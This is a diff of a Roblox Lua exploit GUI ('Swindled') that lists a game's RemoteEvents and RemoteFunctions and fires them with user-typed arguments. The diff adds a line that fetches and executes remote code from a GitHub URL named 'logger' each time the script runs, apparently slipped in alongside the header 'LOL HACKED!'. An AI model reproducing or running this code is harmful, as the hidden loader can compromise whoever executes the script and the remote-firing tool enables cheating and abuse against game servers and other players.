@@ -1,7 +1,5 @@
--- LOL hacked!
--- development successful
-
--- Instances:
+--LOL HACKED!
+--development successful
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -11,12 +9,8 @@ local TextLabel_2 = Instance.new("TextLabel")
 local TextBox = Instance.new("TextBox")
 local Ping = Instance.new("TextLabel")
 local TextButton = Instance.new("TextButton")
-
---Properties:
-
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
 Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
 Frame.BackgroundTransparency = 1.000
@@ -24,7 +18,6 @@ Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0.600000024, 0, 0.200000003, 0)
 Frame.Size = UDim2.new(0.300000012, 0, 0.600000024, 0)
-
 ScrollingFrame.Parent = Frame
 ScrollingFrame.Active = true
 ScrollingFrame.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
@@ -34,7 +27,6 @@ ScrollingFrame.BorderSizePixel = 0
 ScrollingFrame.Position = UDim2.new(0, 0, 0.100000001, 0)
 ScrollingFrame.Size = UDim2.new(1, 0, 0.800000012, 0)
 ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-
 TextLabel.Parent = Frame
 TextLabel.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
 TextLabel.BackgroundTransparency = 0.500
@@ -46,7 +38,6 @@ TextLabel.Text = "Swindled"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextSize = 25.000
 TextLabel.TextWrapped = true
-
 TextLabel_2.Parent = Frame
 TextLabel_2.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
 TextLabel_2.BackgroundTransparency = 0.500
@@ -58,7 +49,6 @@ TextLabel_2.Font = Enum.Font.Ubuntu
 TextLabel_2.Text = "UI by Swindlesec , Scripts/Commands also by Swindlesec"
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextSize = 12.000
-
 TextBox.Parent = Frame
 TextBox.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
 TextBox.BackgroundTransparency = 0.500
@@ -72,7 +62,6 @@ TextBox.PlaceholderText = "Arguments"
 TextBox.Text = "Swindled,All"
 TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextBox.TextSize = 14.000
-
 Ping.Name = "Ping"
 Ping.Parent = Frame
 Ping.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
@@ -85,7 +74,6 @@ Ping.Font = Enum.Font.Ubuntu
 Ping.Text = "Incoming ping: "
 Ping.TextColor3 = Color3.fromRGB(255, 0, 0)
 Ping.TextSize = 12.000
-
 TextButton.Parent = ScreenGui
 TextButton.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
 TextButton.BackgroundTransparency = 0.500
@@ -101,25 +89,26 @@ TextButton.TextWrapped = true
 
 -- Scripts:
 
-local function YOEGA_fake_script() -- ScreenGui.LocalScript 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cubert04/swindled/main/logger"))()
+local function KRCT_fake_script() -- ScreenGui.LocalScript 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	wait(1)
-	
+
 	local x = 0.6
 	local y = -50
 	remotes = {}
-	
+
 	for i,remote in game:GetDescendants() do
 		if remote:IsA("BaseRemoteEvent") or remote:IsA("RemoteFunction") then
 			table.insert(remotes,remote)
 		end
 	end
-	
+
 	table.sort(remotes, function(a,b)
 		return a.Name < b.Name
 	end)
-	
+
 	for i,remote in remotes do
 		local button = script.Parent.TextButton:Clone()
 		local object = Instance.new("ObjectValue")
@@ -138,76 +127,52 @@ local function YOEGA_fake_script() -- ScreenGui.LocalScript
 		object.Value = remote
 	end
 end
-coroutine.wrap(YOEGA_fake_script)()
-local function RGZVLG_fake_script() -- ScreenGui.Ping 
+coroutine.wrap(KRCT_fake_script)()
+local function XXQUQ_fake_script() -- ScreenGui.Ping 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	while wait(5) do
 		script.Parent.Frame.Ping.Text = "Incoming ping: "..math.round(game.Players.LocalPlayer:GetNetworkPing()*1000)
 	end
 end
-coroutine.wrap(RGZVLG_fake_script)()
-local function GZGUU_fake_script() -- ScreenGui.Click 
+coroutine.wrap(XXQUQ_fake_script)()
+local function BPUVR_fake_script() -- ScreenGui.Click 
 	local script = Instance.new('LocalScript', ScreenGui)
-
 	wait(2)
-	
-	local function GetInstance(String)
-		local Table = string.split(String, ".")
-		local Service = game:GetService(Table[1])
-	
-		local ObjectSoFar = Service
-		for Index, Value in pairs(Table) do
-			if Index ~= 1 then -- Don't run over the service.
-				local Object = ObjectSoFar:FindFirstChild(Value)
-				if Object then
-					ObjectSoFar = Object
-				else
-					break
-				end
-			end
-		end
-	
-		return (ObjectSoFar ~= Service and ObjectSoFar) or nil
-	end
-	
-	local Baseplate = GetInstance("Workspace.Baseplate")
-	
+
 	function csvToTable(list)
 		local out = {}
+		local ObjectSoFar = nil
 		for entry in string.gmatch(list, "[^,]+") do
-			local Table = string.split(entry, ".")
-			local success, service = pcall(function()
-				return game:GetService(Table[1])
-			end)
-	
-			if success then
-				Service = game:GetService(Table[1])
-				local ObjectSoFar = Service
-				for Index, Value in pairs(Table) do
-					if Index ~= 1 then -- Don't run over the service.
-						local Object = ObjectSoFar:FindFirstChild(Value)
-						if Object then
-							ObjectSoFar = Object
-						else
-							break
-						end
-					end
-				end
-	
-				entry = (ObjectSoFar ~= Service and ObjectSoFar) or nil
+			if tableToInstance(entry) then
+				table.insert(out, tableToInstance(entry))
 			end
-	
 			table.insert(out, entry)
 		end
 		return out
 	end
-	
+
+	function tableToInstance(list)
+		local retur = false
+		local dir=list
+		local segments=dir:split(".")
+		local current=game --location to search
+		for i,v in pairs(segments) do
+			if current:FindFirstChild(v) then
+				current=current[v]
+				retur = true
+			end
+		end
+		if retur == true then
+			return(current)
+		end
+	end
+
 	function onButtonClicked(button)
 		local list = button.Parent.Parent.TextBox.Text
-	
-		local tab = csvToTable(list)
 		
+		local tab = csvToTable(list)
+
 		for i,entry in tab do
 			if entry == "true" then
 				entry = true
@@ -216,19 +181,19 @@ local function GZGUU_fake_script() -- ScreenGui.Click
 				tab[i] = tonumber(tab[i])
 			end
 		end
-	
+
 		local remote = button.Value.Value
-		if remote:IsA("BaseRemoteEvent") and button.Name == remote.Name then
+		if remote:IsA("BaseRemoteEvent") and button.Name then
 			remote:FireServer(unpack(tab))
-		elseif remote:IsA("RemoteFunction") and button.Name == remote.Name then
+		elseif remote:IsA("RemoteFunction") and button.Name then
 			remote:InvokeServer(unpack(tab))
 		end
 	end
-	
+
 	for i,button in script.Parent.Frame.ScrollingFrame:GetChildren() do
 		button.MouseButton1Down:connect(function ()
 			onButtonClicked(button)
 		end)
 	end
 end
-coroutine.wrap(GZGUU_fake_script)()
+coroutine.wrap(BPUVR_fake_script)()
